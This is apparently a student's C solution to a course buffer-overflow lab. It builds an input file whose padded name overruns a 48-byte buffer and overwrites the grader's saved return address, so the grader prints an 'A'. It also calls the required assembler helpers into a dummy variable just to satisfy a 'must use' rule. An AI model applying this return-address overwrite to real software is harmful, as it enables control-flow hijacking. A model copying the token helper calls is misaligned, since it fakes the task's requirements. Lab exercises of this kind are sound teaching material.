/*
 * createdataA.c
 *
 * Purpose:
 *   Produce a 56-byte file "dataA" that, when fed to the grader
 *   (via stdin or redirection), causes:
 *
 *     • readString() to fill its 48-byte buffer with
 *         "Ben Zhou and Owen Clarke\0" + 23 zeros
 *     • then readString() to overwrite saved_x30 with 0x40089c
 *     • getName() returns → PC ← 0x40089c
 *     • grader’s own code prints the default 'A'
 *
 *   We also *call* each MiniAssembler_* function once (into a dummy)
 *   to satisfy the “must use” requirement.
 */

#include <stdio.h>
#include "miniassembler.h"

int main(void)
{
    FILE         *psFile;
    int           i;
    unsigned long skipB_addr;
    unsigned int  dummy;

    /* --- call each helper once so it’s linked in --- */
    dummy = MiniAssembler_mov(0, 0);
    dummy = MiniAssembler_adr(0, 0, 0);
    dummy = MiniAssembler_strb(0, 0);
    skipB_addr = 0x40089cUL;            /* address right after grade=B */
    dummy = MiniAssembler_b(skipB_addr, 0);

    /* --- open dataA for binary writing --- */
    psFile = fopen("dataA", "wb");
    if (psFile == NULL) {
        return 1;
    }

    /* 1) 24-byte student name */
    fwrite("Ben Zhou and Owen Clarke", 1, 24, psFile);

    /* 2) terminating NUL byte */
    putc('\0', psFile);

    /* 3) 23 more NUL bytes to pad to 48 total */
    for (i = 0;  i < 23;  i++) {
        putc('\0', psFile);
    }

    /* 4) overwrite saved x30 with skipB_addr so grader prints 'A' */
    fwrite(&skipB_addr, sizeof(skipB_addr), 1, psFile);

    fclose(psFile);
    return 0;
}

